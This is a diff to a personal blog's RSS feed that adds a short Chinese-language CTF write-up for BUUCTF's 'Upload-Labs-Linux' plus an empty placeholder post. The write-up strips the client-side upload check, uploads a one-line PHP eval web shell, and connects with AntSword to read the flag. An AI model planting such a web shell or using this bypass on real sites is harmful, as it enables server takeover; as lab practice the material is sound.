@@ -10,8 +10,41 @@
         </author>
         <description>Discover and Record the world.</description>
         <language>zh-CN</language>
-        <pubDate>Fri, 23 Sep 2022 15:53:04 +0800</pubDate>
-        <lastBuildDate>Fri, 23 Sep 2022 15:53:04 +0800</lastBuildDate>
+        <pubDate>Mon, 10 Oct 2022 08:52:48 +0800</pubDate>
+        <lastBuildDate>Mon, 10 Oct 2022 08:52:48 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">http://maxshiroi.top/ug/085248/</guid>
+            <title>Upload-Labs-Linux</title>
+            <link>http://maxshiroi.top/ug/085248/</link>
+            <category term="ctf" scheme="http://maxshiroi.top/tags/ctf/" />
+            <category term="buuctf" scheme="http://maxshiroi.top/tags/buuctf/" />
+            <category term="antsword" scheme="http://maxshiroi.top/tags/antsword/" />
+            <pubDate>Mon, 10 Oct 2022 08:52:48 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;题目预览&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目预览&#34;&gt;#&lt;/a&gt; 题目预览：&lt;/h1&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/Upload-Labs-Linux/20221010085420.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;解决方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解决方法&#34;&gt;#&lt;/a&gt; 解决方法&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;开控制台&lt;/li&gt;
+&lt;li&gt;关闭 javascript
+&lt;blockquote&gt;
+&lt;p&gt;设置 - 偏好设置 - 调试程序&lt;br /&gt;
+删除 &lt;code&gt;onsubmit=&amp;quot;return.checkFile()&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;li&gt;新建一个文件里面写入 &lt;code&gt;&amp;lt;?php @eval($_POST[&#39;123&#39;]);?&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;后缀名改为 php 上传到网站，显示出图片后右键复制链接。&lt;/li&gt;
+&lt;li&gt;打开 antsword，add 一个 url 地址为图片链接，密码为 123，加密 base64.&lt;/li&gt;
+&lt;li&gt;点击链接就能发现根目录有个 flag 文件了。&lt;/li&gt;
+&lt;/ol&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://maxshiroi.top/ug/082833/</guid>
+            <title>linuxlearn2</title>
+            <link>http://maxshiroi.top/ug/082833/</link>
+            <pubDate>Tue, 27 Sep 2022 08:28:33 +0800</pubDate>
+            <description><![CDATA[  ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://maxshiroi.top/ug/155304/</guid>
             <title>Hello World</title>
